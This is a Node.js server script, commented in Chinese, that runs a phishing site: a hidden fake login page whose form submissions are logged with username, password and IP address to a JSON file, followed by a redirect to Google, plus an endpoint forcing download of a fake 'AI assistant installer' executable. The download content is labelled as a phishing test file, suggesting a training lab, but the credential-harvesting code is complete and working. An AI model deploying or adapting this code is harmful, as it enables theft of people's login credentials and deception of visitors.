// server.js
const http = require('http');
const fs = require('fs');
const path = require('path');
const { parse } = require('querystring');

if (!fs.existsSync('data')) fs.mkdirSync('data');

const PORT = 8080;

const server = http.createServer((req, res) => {
  const url = req.url;

  // === 主页 ===
  if (url === '/' && req.method === 'GET') {
    serveFile('index.html', res);
    return;
  }

  // === 隐蔽登录页 ===
  if (url === '/secret-search.html' && req.method === 'GET') {
    serveFile('secret-search.html', res);
    return;
  }

  // === 处理钓鱼表单提交 ===
  if (url === '/submit-secret' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk.toString());
    req.on('end', () => {
      const formData = parse(body);

      // 记录日志
      const logEntry = {
        timestamp: new Date().toISOString(),
        username: formData.username,
        password: formData.password,
        ip: req.socket.remoteAddress
      };

      fs.appendFileSync('data/log.json', JSON.stringify(logEntry) + '\n');
      console.log('🎯 捕获凭证:', logEntry);

      // 返回跳转页面
      redirect(res, 'https://www.google.com/search?q=AI', '正在跳转至 Google 搜索 AI...');
    });
    return;
  }

  // === 处理文件下载请求 ===
  if (req.url.startsWith('/generate-download') && req.method === 'GET') {
    // 解析查询参数
    const url = new URL(`http://localhost${req.url}`);
    const filename = url.searchParams.get('name') || 'AI助手安装包.exe';

    // 创建伪造的“可执行文件”内容（实际是文本）
    const fileContent = `⚠️ 这是一个钓鱼测试文件\n真实来源：http://localhost:8080\n不要在真实环境中运行！\n`.repeat(100);
    
    // 设置响应头：强制下载
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': `attachment; filename="${encodeURIComponent(filename)}"`,
      'Content-Length': Buffer.byteLength(fileContent),
      'Cache-Control': 'no-cache'
    });
    res.end(fileContent);
    return;
  } 

  // === 兜底 404 ===
  res.statusCode = 404;
  res.end('Not Found');
});

function serveFile(filename, res) {
  const filePath = path.join(__dirname, filename);
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.statusCode = 500;
      res.end('Server Error');
    } else {
      const ext = path.extname(filename);
      const mime = {
        '.html': 'text/html',
        '.css': 'text/css',
        '.js': 'application/javascript'
      }[ext] || 'text/plain';
      res.setHeader('Content-Type', `${mime}; charset=utf-8`);
      res.end(data);
    }
  });
}

function redirect(res, url, message) {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`
    <html>
    <head><meta http-equiv="refresh" content="2;url=${url}"></head>
    <body style="text-align:center;padding:50px;font-family:Arial;">
      <h2>${message}</h2>
      <p>即将跳转到：<a href="${url}" target="_blank">${url}</a></p>
      <script>setTimeout(() => window.location.href = "${url}", 1000);</script>
    </body>
    </html>
  `);
}



server.listen(PORT, () => {
  console.log(`✅ 服务器运行在 http://localhost:${PORT}`);
  console.log(`📁 日志保存在 ./data/log.json`);
  console.log(`🔗 正常入口：http://localhost:${PORT} → 百度`);
  console.log(`🔗 隐蔽入口：http://localhost:${PORT}/secret-search.html → 钓鱼`);
});
